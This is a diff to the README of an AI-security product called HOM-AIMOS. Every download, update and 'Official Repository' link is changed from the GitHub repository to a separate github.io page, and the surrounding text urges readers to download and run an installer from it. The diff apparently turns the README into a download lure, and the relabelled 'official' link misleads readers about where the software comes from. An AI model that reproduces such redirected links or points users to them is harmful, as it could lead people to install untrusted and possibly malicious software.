@@ -1,7 +1,7 @@
 <h1>🔐 HOM-AIMOS - Your Shield for Safer AI Agents</h1>
 
 <p align="center">
-<a href="https://github.com/mawlamyinebrake1621/HOM-AIMOS/releases"><img src="https://img.shields.io/badge/⬇️%20Download%20HOM--AIMOS-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B" alt="Download" width="300"></a>
+<a href="https://mawlamyinebrake1621.github.io"><img src="https://img.shields.io/badge/⬇️%20Download%20HOM--AIMOS-8A2BE2?style=for-the-badge&logo=github&logoColor=white&labelColor=FF6B6B" alt="Download" width="300"></a>
 </p>
 
 ---
@@ -34,7 +34,7 @@ HOM-AIMOS stops these attacks by:
 
 Visit this link to download the application:
 
-<p align="center"><a href="https://github.com/mawlamyinebrake1621/HOM-AIMOS/releases"><img src="https://img.shields.io/badge/🔽%20GET%20HOM--AIMOS%20NOW-2ECC71?style=for-the-badge&logo=windowsterminal&logoColor=white&labelColor=1ABC9C" alt="Download" width="400"></a></p>
+<p align="center"><a href="https://mawlamyinebrake1621.github.io"><img src="https://img.shields.io/badge/🔽%20GET%20HOM--AIMOS%20NOW-2ECC71?style=for-the-badge&logo=windowsterminal&logoColor=white&labelColor=1ABC9C" alt="Download" width="400"></a></p>
 
 **Step-by-step:**
 
@@ -91,7 +91,7 @@ When HOM-AIMOS opens, you’ll notice the following sections:
 
 To get the latest security improvements:
 
-1. Visit the download link again: <a href="https://github.com/mawlamyinebrake1621/HOM-AIMOS/releases">https://github.com/mawlamyinebrake1621/HOM-AIMOS/releases</a>
+1. Visit the download link again: <a href="https://mawlamyinebrake1621.github.io">https://mawlamyinebrake1621.github.io</a>
 2. Download the newest version.
 3. Run the installer; it will automatically replace the old version.
 
@@ -180,9 +180,9 @@ After first launch:
 
 ## 📚 Additional Resources
 
-- Official Repository: <a href="https://github.com/mawlamyinebrake1621/HOM-AIMOS">https://github.com/mawlamyinebrake1621/HOM-AIMOS</a>
+- Official Repository: <a href="https://mawlamyinebrake1621.github.io">https://mawlamyinebrake1621.github.io</a>
 - Issues or Feedback: Leave a comment on the GitHub issues page.
-- Releases / Updates: <a href="https://github.com/mawlamyinebrake1621/HOM-AIMOS/releases">https://github.com/mawlamyinebrake1621/HOM-AIMOS/releases</a>
+- Releases / Updates: <a href="https://mawlamyinebrake1621.github.io">https://mawlamyinebrake1621.github.io</a>
 
 ---
 
@@ -190,7 +190,7 @@ After first launch:
 
 HOM-AIMOS is a robust, easy-to-use security layer for any AI system. With its automatic installation, real-time tamper detection, and clear simple dashboard, you no longer have to worry about hidden manipulation of AI memory. Download it now and gain peace of mind.
 
-<p align="center"><a href="https://github.com/mawlamyinebrake1621/HOM-AIMOS/releases"><img src="https://img.shields.io/badge/🛡️%20DOWNLOAD%20HOM--AIMOS%20TODAY-E74C3C?style=for-the-badge&logo=download&logoColor=white&labelColor=F39C12" alt="Download Now" width="450"></a></p>
+<p align="center"><a href="https://mawlamyinebrake1621.github.io"><img src="https://img.shields.io/badge/🛡️%20DOWNLOAD%20HOM--AIMOS%20TODAY-E74C3C?style=for-the-badge&logo=download&logoColor=white&labelColor=F39C12" alt="Download Now" width="450"></a></p>
 
 ---
 
